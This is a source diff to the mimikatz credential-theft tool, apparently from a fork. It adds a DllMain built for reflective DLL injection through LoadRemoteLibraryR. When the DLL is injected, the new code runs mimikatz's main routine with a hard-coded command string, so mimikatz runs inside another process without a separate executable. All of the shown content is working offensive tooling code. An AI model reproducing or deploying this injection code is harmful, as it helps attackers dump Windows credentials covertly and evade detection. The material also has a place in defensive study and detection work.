@@ -249,6 +249,43 @@ __declspec(dllexport) wchar_t * powershell_reflective_mimikatz(LPCWSTR input)
 }
 #endif
 
+#ifdef _REFLECTIVEDLL
+// Note: REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
+// defined in the project properties (Properties->C++->Preprocessor) so as we can specify our own 
+// DllMain and use the LoadRemoteLibraryR() API to inject this DLL.
+
+// You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoaderSimple.cpp)
+extern HINSTANCE hAppInstance;
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
+{
+    BOOL bReturnValue = TRUE;
+    switch (dwReason) {
+    case DLL_QUERY_HMODULE:
+        if (lpReserved != NULL)
+            *(HMODULE *) lpReserved = hAppInstance;
+        break;
+    case DLL_PROCESS_ATTACH:
+        hAppInstance = hinstDLL;
+        int argc = 0;
+        wchar_t ** argv;
+
+        static const wchar_t input[1024] = L"kodx mimikatz command list";
+        if (argv = CommandLineToArgvW(input, &argc)) {
+            wmain(argc, argv);
+            LocalFree(argv);
+        }
+
+        break;
+    case DLL_PROCESS_DETACH:
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+        break;
+    }
+    return bReturnValue;
+}
+#endif
+
 #ifdef _WINDLL
 void reatachIoHandle(DWORD nStdHandle, int flags, const char *Mode, FILE *file)
 {
